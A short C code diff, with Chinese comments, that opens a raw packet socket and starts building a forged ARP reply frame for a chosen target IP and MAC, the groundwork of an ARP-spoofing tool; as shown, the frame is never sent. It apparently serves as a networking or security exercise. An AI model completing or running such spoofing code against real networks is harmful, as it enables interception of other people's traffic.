@@ -30,6 +30,28 @@ int main(int argc, char const *argv[]) {
     input_ip(TARGET_IP);
     printf("Your MAC: ");
     input_mac(SOURCE_MAC);
+    //创建套接字
+    int soc;
+    u_char frame[42]; //以太网头部和ARP头部总长
+    soc = socket(AF_PACKET, SOCK_RAW, htons(EPT_ARP));
+    if (soc == -1) {
+        printf("Socket creat failed!\n");
+        exit(1);
+    }
+    printf("Socket created!\n");
+    //构建伪造ARP帧
+    ethernet_header ehead;
+    arp_header arphead;
+    memcpy(ehead.DST_mac, TARGET_MAC, 6);
+    memcpy(ehead.SRC_mac, SOURCE_MAC, 6);
+    ehead.eth_type = htons(EPT_ARP);
+    arphead.hardware_type = htons(ARPHRD_ETHER);
+    arphead.protocol_type = htons(EPT_IPv4);
+    arphead.hardware_len = 6;
+    arphead.protocol_len = 4;
+    arphead.aro_op = htons(ARPOP_REPLY);
+    memcpy(arphead.src_mac, SOURCE_MAC, 6);
+    memcpy(arphead.src_ip, SOURCE_IP, 4);
     
     return 0;
 }
